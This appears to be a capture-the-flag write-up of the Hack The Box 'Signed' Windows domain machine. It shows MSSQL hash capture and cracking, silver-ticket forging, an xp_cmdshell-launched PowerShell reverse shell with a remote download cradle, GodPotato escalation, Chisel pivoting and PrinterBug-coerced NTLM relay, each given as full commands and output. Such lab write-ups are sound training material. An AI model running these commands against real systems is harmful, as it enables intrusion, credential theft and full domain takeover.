---
title: "HTB: Signed"
# description: ""
date: "2026-02-08 11:33:00 +0800"
categories: [hackthebox,windows-AD]
tags: [mssql,nxc,mssqlclient,xp-dirtree,xp-cmdshell,coerce,nxc-coerce-plus,printer-bug,silver-ticket,ticketer,chisel,seimpersonate,recover-seimpersonate,ntlmrelayx,ntlm-relay,dnstool,godpotato responder,powershell-history,openrowset,service-ticket,named-pipe,krbrelayx,petitpotam,powershell-revshell]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/signed.png
#   alt: "HTB: Certified"
---
**Signed is a medium Windows box involving MSSQL exploitation: capture and crack the service account's NTLMv2 hash, forge silver tickets for impersonation, enumerate the domain via MSSQL to impersonate Administrator for RCE, then escalate via CVE-2025-33073 (NTLM reflection/self-relay bypass) to access WinRMS**

**As is common in Windows pentests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH**

---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Credentials</span>
I'll verify that the credentials work over the MSSQL service.The credentials work, but only with the `--local-auth` flag.

```console
$ nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH'
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
$ nxc mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
```

Add above to hosts file:
```console
$ sudo vi /etc/hosts
10.129.242.173  DC01.signed.htb DC01 signed.htb
```

### <span style="color:lightgreen">MSSQL - TCP 1433</span>
I can connect to the MSSQL using `impacket-mssqlclient`  with the following command:
```console
$ impacket-mssqlclient 'scott:Sm230#C5NatH@10.129.242.173'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

I’ll check for xp_cmdshell first,It’s disabled, and scott doesn’t have permissions to enable it:

```console
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE state
SQL (scott  guest@master)> xp_cmdshell whoami
ERROR(DC01): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```
I'll check the database content next, but only have default databases:
```console
SQL (scott  guest@master)> SELECT name FROM sys.databases;
name     
------   
master   
tempdb   
model    
msdb  

SQL (scott  guest@master)> enum_db
name       is_trustworthy_on
------     -----------------
master                     0
tempdb                     0
model                      0
msdb                       1
```
Checking for impersonation and linked servers returned no interesting results:
```console
SQL (scott  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
SQL (scott  guest@master)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------
```
After listing the logins, I found only `scott` and the `sa` (admin) account:
```console
SQL (scott  guest@master)> enum_logins
name    type_desc   is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
-----   ---------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa      SQL_LOGIN             0          1               0             0            0              0           0           0           0   
scott   SQL_LOGIN             0          0               0             0            0              0           0           0           0
```

I can use `xp_dirtree` to enumerate the filesystem; specifically, I'll attempt to list the contents of the `C:\` drive:
```console
SQL (scott  guest@master)> xp_dirtree "C:\"
subdirectory   depth   
------------   -----  
```

## <span style="color:lightblue">Auth as mssqlsvc</span>
### <span style="color:lightgreen">Coerce Hash</span>

`xp_dirtree` didn't show anything, but the machine might be able to connect to a remote SMB share (my share). I'll start Responder to listen on `tun0`.
```console
$ sudo responder -I tun0
...[snip]...
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.16]
    Responder IPv6             [dead:beef:2::100e]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-DIOQQ6Y3BSS]
    Responder Domain Name      [BB40.LOCAL]
    Responder DCE-RPC Port     [49815]
    
[+] Listening for events...
```
Now, I'll attempt to list a directory from a remote SMB share on my host:
```console
SQL (scott  guest@master)> xp_dirtree \\10.10.14.8\DoesNotMatter
subdirectory   depth   file   
------------   -----   ----   
```
I've successfully captured a hash in Responder:
```console
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.242.173
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:ddecccf61cda2e75:0BC9A74AF8C16AA7..snip..
```

### <span style="color:lightgreen">Crack NTLMv2</span>
The NTLMv2 hash was successfully cracked, providing plain-text credentials for the domain account `mssqlsvc`:
```console
$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
5600 | NetNTLMv2 | Network Protocol
...[snip]...
MSSQLSVC::SIGNED:ddecccf61cda2e75:0bc9a74af8c16aa73a838979e7..snip..00:purPLE9795!@
...[snip]...
```
We got the domain account `mssqlsvc`:
```console
$ nxc mssql 10.129.242.173 -u mssqlsvc -p 'purPLE9795!@' 
MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
```

## <span style="color:lightblue">Shell as MSSQL</span>
I can connect with `impacket-mssqlclient`, but to use a domain account, I need to add the `-windows-auth` flag.

```console
$ impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.129.242.173 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

It is still showing guest privileges. This account is not an admin:
```console
SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0  
```
Listing the logins:
```console
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   
SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0  
```

### <span style="color:lightgreen">Silver Ticket</span>
A Silver Ticket is a forged Kerberos Service Ticket (TGS) created using the NTLM hash of a service account. Unlike a Golden Ticket, a Silver Ticket targets a specific service. In this case, since I have the password of the `mssqlsvc` account, I can craft a TGS for the MSSQL service to gain unauthorized access.
To create a Silver ticket, I’ll need:
1. The NTLM hash of the service account password.
2. The domain SID

I will convert the plaintext password into its corresponding NTLM hash using Python:
```console
$ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
ef699384c3285c54128a3ee1ddb1a0cc
```

To obtain the Domain SID, I’ll query it directly from the database:

```console
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Users');

-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000' 
```

I'll use Impacket's library to translate the binary SID format into a standard SID string:
```console
$ python3               
Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from impacket.dcerpc.v5.dtypes import SID
>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
'S-1-5-21-4088429403-1159899800-2753317549-513'
```

#### TGS as Administrator [Fail]
I'll craft a ticket for the `Administrator user`. However, the database is configured such that the Administrator account lacks high-level privileges and is instead mapped to a `guest` role:
```console
$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn DoesNotMatter/DC01.signed.htb -user-id 500 Administrator
$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
..snip..
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  guest@master)>
```
#### TGS with IT Group
Above listing the logins, I discovered that the `SIGNED\IT` group has sysadmin privileges. Therefore, I'll add the`-groups`flag to my ticket forging process to include this group's SID.

```console
SQL (SIGNED\Administrator  guest@master)> select SUSER_SID('Signed\IT')                                                  
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000' 

>>> from impacket.dcerpc.v5.dtypes import SID
>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000')).formatCanonical()
'S-1-5-21-4088429403-1159899800-2753317549-1105'
```

add `-groups 1105` to the ticket:
```console
$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn DoesNotMatter/DC01.signed.htb -groups 1105 -user-id 500 Administrator
..snip..
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```
The user context is now `dbo` rather than `guest`. Success!
```console
$ KRB5CCNAME=Administrator.ccache mssqlclient.py -no-pass -k DC01.signed.htb
..snip..
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)> 
```

### <span style="color:lightgreen">Powershell revshell</span>
With `sysadmin` privileges (via the IT group membership), I can enable `xp_cmdshell`:
```console
SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell whoami
output            
---------------   
signed\mssqlsvc   
NULL 
```

Use Nishang's `Invoke-PowerShellTcpOneLine.ps1` to obtain a reverse shell.
```console
$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1                                                                                                                                                       
$ vi shell.ps1     
client = New-Object System.Net.Sockets.TCPClient('10.10.14.8',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Encode the PowerShell command into Base64 to bypass length limits and character filtering. Then, start a Python HTTP server and a Netcat listener to facilitate the exploit.
```console
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/shell.ps1')" | iconv -t utf16le | base64 -w0
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgAOgA4ADAAMAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==

$ python3 -m http.server
$ rlwrap nc -lvnp 9001
```

Pass a PowerShell:
```console
SQL (SIGNED\Administrator  dbo@master)> xp_cmdshell "powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADgAOgA4ADAAMAAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA=="
```

And we get shell and user flag:
```
$ rlwrap nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.242.173 62457

PS C:\Windows\system32> type C:\Users\mssqlsvc\Desktop\user.txt" 
3d5747bd************************   
```

## <span style="color:lightblue">Many Escalations</span>
### <span style="color:lightgreen">OPENROWSET BULK Impersonation - File Read </span>
There’s an interesting quirk involving MSSQL and its OPENROWSET function: it will utilize the groups specified in the authenticating service ticket, provided the ticket is issued for the service account running MSSQL (in this case, mssqlsvc).

I’ll change two options to `impacket-ticketer` call:
1. `-user-id 1103`: Forces the User ID to match that of mssqlsvc.
2. `-groups 512,1105`: Includes group 1105 (IT) to gain sysadmin privileges on the database, and 512 (Domain Admins)—though any privileged domain group would suffice here—to grant me file system access.

```console
$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn DoesNotMatter/DC01.signed.htb -user-id 1103 -groups 512,1105 mssqlsvc
..snip..
[*] Saving ticket in mssqlsvc.ccache

$ KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient -no-pass -k DC01.signed.htb
..snip..
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Using `OPENROWSET` with the `BULK` keyword can read files:
```console
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;

BulkColumn                                
---------------------------------------   
b'2e43af1f************************\r\n'
```

The Administrator's PowerShell history file is a high-value target; we can find the Administrator’s password therein:
```console
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents;

BulkColumn
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
b'# Domain`\n$Domain = "signed.htb"`\n`\n
..snip..
Get-NetConnectionProfile
Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "Th1s889Rabb!t" -AsPlainText -Force) -Reset
Set-Service TermService -StartupType disabled
..snip..
```

### <span style="color:lightgreen">SeImpersonate Restoration</span>
Although the mssqlsvc shell uses a restricted token lacking `SeImpersonatePrivilege` for hardening, the original, privileged token remains stored in LSASS from the initial boot authentication. By creating a named pipe, an attacker can force the kernel’s SMB redirector to authenticate using that stored token. Impersonating this pipe connection allows the recovery of the original token and its associated privileges. 

A [post](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html) from Tyranid’s Lair goes into detail on how to recover this original token by creating a named pipe.


#### Build Module
Use `pwsh` to download `NtObjectManager` module and zip it.
```console
$ sudo pwsh
PowerShell 7.5.4
PS /home/willy> Install-Module -Name PSWSMan
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
PS /home/willy> Install-Module -Name NtObjectManager
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

PS /home/willy> Save-Module -Name NtObjectManager -Path /home/willy/htb
PS /home/willy> Compress-Archive -Path /home/willy/htb/NtObjectManager/* -DestinationPath /home/willy/htb/NtObjectManager/NtObjectManager.zip
```
Start a Python server, then download the ZIP file on the target machine while ensuring file integrity to avoid corruption.
```console
PS C:\programdata> iwr http://10.10.14.8/NtObjectManager.zip -outfile NtObjectManager.zip
PS C:\programdata> expand-archive NtObjectManager.zip -destinationpath .
PS C:\programdata> cd NtObjectManager
PS C:\programdata\release> import-module .\NtObjectManager.psm1
```

#### Get Token
I’ll run through the steps in the post. First I’ll create a pipe and start a job with that pipe listening:
```console
PS C:\programdata> $pipe = New-NtNamedPipeFile \\.\pipe\ABC -Win32Path                                         
PS C:\programdata> $job = Start-Job { $pipe.Listen() }
PS C:\programdata> $job

Id     Name            PSJobTypeName   State         HasMoreData     Location             Command                  
--     ----            -------------   -----         -----------     --------             -------                  
7      Job7            BackgroundJob   Completed     True            localhost   
```

Now I’ll open a handle to the pipe and get the token from the client:
```console
PS C:\programdata> $file = Get-NtFile \\localhost\pipe\ABC -Win32Path
PS C:\programdata> $token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation }
```
This token has `SeImpersonatePrivilege`:
```console
PS C:\programdata\release> $token.privileges | ft Name, Attributes, DisplayName

Name                                         Attributes DisplayName                              
----                                         ---------- -----------                              
SeAssignPrimaryTokenPrivilege                   Enabled Replace a process level token            
SeIncreaseQuotaPrivilege                        Enabled Adjust memory quotas for a process       
SeMachineAccountPrivilege                       Enabled Add workstations to domain               
SeChangeNotifyPrivilege       EnabledByDefault, Enabled Bypass traverse checking                 
SeImpersonatePrivilege        EnabledByDefault, Enabled Impersonate a client after authentication
SeCreateGlobalPrivilege       EnabledByDefault, Enabled Create global objects                    
SeIncreaseWorkingSetPrivilege                   Enabled Increase a process working set 
```

#### Process With Token
To start a new process with this token, I’ll use `New-Win32Process`. Since I can't view STDOUT or STDERR directly, I’ll redirect the output to a file:
```console
PS C:\programdata> New-Win32Process -Commandline 'cmd.exe /c whoami /priv 2>&1 > /programdata/output.txt' -token $token

Process            : cmd.exe
Thread             : thread:4272 - process:3700
Pid                : 3700
Tid                : 4272
TerminateOnDispose : False
ExitStatus         : 259
ExitNtStatus       : STATUS_PENDING
```
The result shows `SeImpersonatePrivilege`:
```console
PS C:\programdata> cat output.txt

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            
```

#### GodPotato
I’ll use `GodPotato` to escalate privileges via `SeImpersonatePrivilege`, then upload it along with the `shell.ps1` mentioned above:
```console
PS C:\programdata> iwr http://10.10.14.8:8000/GodPotato-NET4.exe -outfile gp.exe
PS C:\programdata> iwr http://10.10.14.8:8000/shell.ps1 -outfile shell.ps1
```
Now I’ll run `gp.exe` with the reverse shell:
```console
PS C:\programdata> New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"' -token $token

Process            : gp.exe
Thread             : thread:4852 - process:3816
Pid                : 3816
Tid                : 4852
TerminateOnDispose : False
ExitStatus         : 259
ExitNtStatus       : STATUS_PENDING
```console

At `nc`, I get a shell as system:
```console
$ rlwrap nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.242.173 56071

PS C:\Windows\system32> whoami
nt authority\system
```

### <span style="color:lightgreen">NTLM Relay</span>
By leveraging an empty `CREDENTIAL_TARGET_INFORMATION` structure, an authentication attempt is coerced from the Domain Controller (DC). This method involves creating a non-conflicting DNS record that Kerberos interprets as the legitimate DC (DC01). This allows an attacker to effectively masquerade as the DC to intercept or redirect authentication traffic.
Refer this [article](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx).
#### Chisel
I will first use `Chisel` to pivot through `localhost`, enabling access to internal services beyond the exposed MSSQL port (1433).

Setting listen and  making sure the end of my /etc/proxychains.conf is set up:
```
$ ./chisel_1.10.0_linux_amd64 server --reverse -p 9000 -socks5

$ sudo vi /etc/proxychains4.conf
..snip..
[ProxyList]
socks5  127.0.0.1 1080
```

connect it:
```
PS C:\programdata> iwr http://10.10.14.8:8000/chisel.exe -outfile c.exe
PS C:\programdata> .\c.exe client 10.10.14.8:9000 R:socks
```

Now I can access other ports, like SMB:
```
$ proxychains -q nxc smb 127.0.0.1
SMB         127.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
```

#### Generate DNS Record
I’ll use `dnstool.py` (from krbrelayx) to create a DNS record on the domain with the following options:
```console
$ proxychains -q python3 dnstool.py -u 'SIGNED\mssqlsvc' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA -d 10.10.14.8 10.129.242.173

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

#### Relay
I’ll run `impacket-ntlmrelayx` to catch the authentication and relay it into a WinRM-based shell:
```
$ proxychains -q impacket-ntlmrelayx -t winrms://DC01.signed.htb -smb2support
..snip..
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

#### Coerce
Various well-known techniques exist for coercing Windows authentication. While the NetExec`COERCE_PLUS`module includes several built-in options, I will specifically use PrinterBug (or PetitPotam) to minimize redundant authentication traffic.
```
$ proxychains -q nxc smb DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA M=PrinterBug
SMB         10.129.242.173  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.242.173  445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@ 
COERCE_PLUS 10.129.242.173  445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.129.242.173  445    DC01             Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
```

At `ntlmrelayx`:
```
[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://DC01.signed.htb
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://DC01.signed.htb SUCCEED [1]
[*] winrms:///@dc01.signed.htb [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
```
It started a shell on `localhost:11000`, which I’ll connect to now. This is a stateless shell, as I’m unable to change directories between commands. Regardless, I can still read the flag:
```console
$ nc localhost 11000
Type help for list of commands

# DIR C:\Users\Administrator\Desktop
Volume in drive C has no label.
Volume Serial Number is BED4-436E

 Directory of C:\Users\Administrator\Desktop

10/06/2025  04:04 AM    <DIR>          .
10/06/2025  04:04 AM    <DIR>          ..
02/01/2026  05:04 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,367,277,056 bytes free

# type C:\Users\Administrator\Desktop\root.txt
2e43af1f************************
```


